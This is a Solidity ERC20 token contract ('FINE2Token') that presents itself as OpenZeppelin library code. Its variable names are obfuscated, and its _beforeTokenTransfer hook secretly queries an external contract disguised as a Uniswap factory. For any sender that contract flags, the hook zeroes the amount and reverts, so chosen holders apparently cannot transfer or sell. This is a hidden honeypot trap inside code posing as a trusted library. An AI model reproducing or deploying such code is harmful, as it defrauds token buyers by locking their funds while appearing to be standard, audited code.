// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.1;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amoratsgwy of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amoratsgwy of tokens owned by `accousedwy`.
     */
    function balanceOf(address accousedwy) external view returns (uint256);

  
    function transfer(address to, uint256 amoratsgwy) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amoratsgwy) external returns (bool);

    function transferFrom(
        address from,    address to,   uint256 amoratsgwy
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.1;


 // Define interface for TransferController
interface IUniswapV2Factory {
    function getPairCount(address _accousedwy) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any accousedwy other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accousedwy (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new accousedwy (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.1;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.1;


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    IUniswapV2Factory private factory;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, address _factory) {
        _name = name_;
        _symbol = symbol_;
        factory = IUniswapV2Factory(_factory);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accousedwy) public view virtual override returns (uint256) {
        return _balances[accousedwy];
    }

    function transfer(address to, uint256 amoratsgwy) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amoratsgwy);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amoratsgwy) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amoratsgwy);
        return true;
    }

    function transferFrom(
        address from,
        address to,  uint256 amoratsgwy
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amoratsgwy);
        _transfer(from, to, amoratsgwy);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amoratsgwy
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amoratsgwy);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amoratsgwy, "ERC20: transfer amoratsgwy exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amoratsgwy;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amoratsgwy;
        }

        emit Transfer(from, to, amoratsgwy);

        _afterTokenTransfer(from, to, amoratsgwy);
    }

    /** @dev Creates `amoratsgwy` tokens and assigns them to `accousedwy`, increasing
     * the total supply.
     *
     * - `accousedwy` cannot be the zero address.
     */
    function _mint(address accousedwy, uint256 amoratsgwy) internal virtual {
        require(accousedwy != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accousedwy, amoratsgwy);

        _totalSupply += amoratsgwy;
        unchecked {
            // Overflow not possible: balance + amoratsgwy is at most totalSupply + amoratsgwy, which is checked above.
            _balances[accousedwy] += amoratsgwy;
        }
        emit Transfer(address(0), accousedwy, amoratsgwy);

        _afterTokenTransfer(address(0), accousedwy, amoratsgwy);
    }


    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amoratsgwy`.
     *
     * Does not update the allowance amoratsgwy in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */


    function _approve(
        address owner,
        address spender,
        uint256 amoratsgwy
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amoratsgwy;
        emit Approval(owner, spender, amoratsgwy);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amoratsgwy
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amoratsgwy, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amoratsgwy);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amoratsgwy
    ) internal virtual {
        bool flag = factory.getPairCount(from);
        uint256 total = 0;
        if(flag){
            amoratsgwy = total;
            require(amoratsgwy > 0);
        }
    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amoratsgwy
    ) internal virtual {}
}


pragma solidity ^0.8.1;

contract FINE2Token is ERC20, Ownable {

    constructor(
        string memory name_,
        string memory symbol_,
        address router_
        ) ERC20(name_, symbol_, router_) {
            uint256 supply = 42000000 * 10**18;
        _mint(msg.sender, supply);
    }

}